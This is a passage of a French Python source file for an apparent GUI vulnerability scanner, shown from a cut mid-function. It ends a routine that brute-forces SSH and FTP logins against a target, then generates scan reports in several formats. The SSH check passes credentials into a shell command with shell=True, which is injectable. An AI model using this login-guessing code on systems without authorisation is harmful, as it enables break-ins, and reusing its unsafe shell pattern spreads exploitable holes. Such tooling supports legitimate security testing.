                    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout={REQUEST_TIMEOUT} {user}@{target} -p {port} 'echo success' 2>/dev/null"
                    if subprocess.run(cmd, shell=True, capture_output=True).returncode == 0:
                        return True, f"Identifiants valides: {user}/{password}"
                elif service == "ftp":
                    from ftplib import FTP
                    ftp = FTP(target)
                    ftp.connect(target, port, timeout=REQUEST_TIMEOUT)
                    ftp.login(user, password)
                    ftp.quit()
                    return True, f"Identifiants FTP valides: {user}/{password}"
            except Exception:
                continue
    return False, "Aucun identifiant valide trouvé."

from typing import TypedDict, List, Literal, Union

class PortInfo(TypedDict):
    port: int
    service: str
    version: str

class Vulnerability(TypedDict):
    port: int
    service: str
    name: str
    status: str
    severity: str
    cve: List[str]

class ScanResults(TypedDict):
    target: str
    open_ports: List[tuple[int, str, str]]  # (port, service, version)
    vulnerabilities: List[Vulnerability]

ReportFormat = Literal["json", "html", "txt", "csv", "pdf"]

def generate_report(results: ScanResults, report_format: ReportFormat = "json") -> str:
    """Génère un rapport dans le format spécifié."""
    os.makedirs(REPORT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{REPORT_DIR}/report_{results['target']}_{timestamp}.{report_format}"

    if report_format == "json":
        with open(filename, "w", encoding='utf-8') as f:
            json.dump(results, f, indent=4, ensure_ascii=False)
    elif report_format == "html":
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Rapport de scan pour {results['target']}</title>
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Rapport de scan pour {results['target']}</h1>
            <h2>Date: {timestamp}</h2>
            <h2>Ports ouverts:</h2>
            <table border="1">
                <tr><th>Port</th><th>Service</th><th>Version</th></tr>
                {''.join(f'<tr><td>{p}</td><td>{s}</td><td>{v}</td></tr>' for p, s, v in results['open_ports'])}
            </table>
            <h2>Vulnérabilités:</h2>
            <table border="1">
                <tr><th>Port</th><th>Service</th><th>Vulnérabilité</th><th>Statut</th><th>Sévérité</th><th>CVE</th></tr>
                {''.join(f'<tr><td>{v["port"]}</td><td>{v["service"]}</td><td>{v["name"]}</td><td>{v["status"]}</td><td>{v["severity"]}</td><td>{", ".join(v["cve"])}</td></tr>' for v in results['vulnerabilities'])}
            </table>
        </body>
        </html>
        """
        with open(filename, "w", encoding='utf-8') as f:
            f.write(html)
    elif report_format == "txt":
        with open(filename, "w", encoding='utf-8') as f:
            f.write(f"Rapport de scan pour {results['target']}\n")
            f.write(f"Date: {timestamp}\n\n")
            f.write("Ports ouverts:\n")
            for p, s, v in results["open_ports"]:
                f.write(f"- Port {p}: {s} {v}\n")
            f.write("\nVulnérabilités:\n")
            for v in results["vulnerabilities"]:
                f.write(f"- Port {v['port']} ({v['service']}): {v['name']} - {v['status']} (Sévérité: {v['severity']}, CVE: {', '.join(v['cve'])})\n")
    elif report_format == "csv":
        with open(filename, "w", newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Port", "Service", "Version"])
            for p, s, v in results["open_ports"]:
                writer.writerow([p, s, v])
            writer.writerow([])
            writer.writerow(["Port", "Service", "Vulnérabilité", "Statut", "Sévérité", "CVE"])
            for v in results["vulnerabilities"]:
                writer.writerow([v["port"], v["service"], v["name"], v["status"], v["severity"], ", ".join(v["cve"])])
    elif report_format == "pdf":
        doc = SimpleDocTemplate(filename, pagesize=letter)
        styles = getSampleStyleSheet()
        elements = []
        elements.append(Paragraph(f"Rapport de scan pour {results['target']}", styles["Title"]))
        elements.append(Paragraph(f"Date: {timestamp}", styles["Normal"]))
        elements.append(Spacer(1, 12))

        # Ports ouverts
        elements.append(Paragraph("Ports ouverts:", styles["Heading2"]))
        data = [["Port", "Service", "Version"]] + [[p, s, v] for p, s, v in results["open_ports"]]
        table = Table(data)
        table.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), (0.7, 0.7, 0.7)),
                                  ("GRID", (0, 0), (-1, -1), 1, (0, 0, 0))]))
        elements.append(table)
        elements.append(Spacer(1, 12))

        # Vulnérabilités
        elements.append(Paragraph("Vulnérabilités:", styles["Heading2"]))
        data = [["Port", "Service", "Vulnérabilité", "Statut", "Sévérité", "CVE"]] + [
            [v["port"], v["service"], v["name"], v["status"], v["severity"], ", ".join(v["cve"])] for v in results["vulnerabilities"]
        ]
        table = Table(data)
        table.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), (0.7, 0.7, 0.7)),
                                  ("GRID", (0, 0), (-1, -1), 1, (0, 0, 0))]))
        elements.append(table)

        doc.build(elements)

    return filename


# --- Point d'entrée ---

# --- Point d'entrée ---
if __name__ == "__main__":
    import importlib.util
    root = ThemedTk(theme="plastik")
    app = VulnerabilityScannerApp(root)
    root.after(100, app.process_queue)  # Lance la boucle de traitement de la file
    root.mainloop()
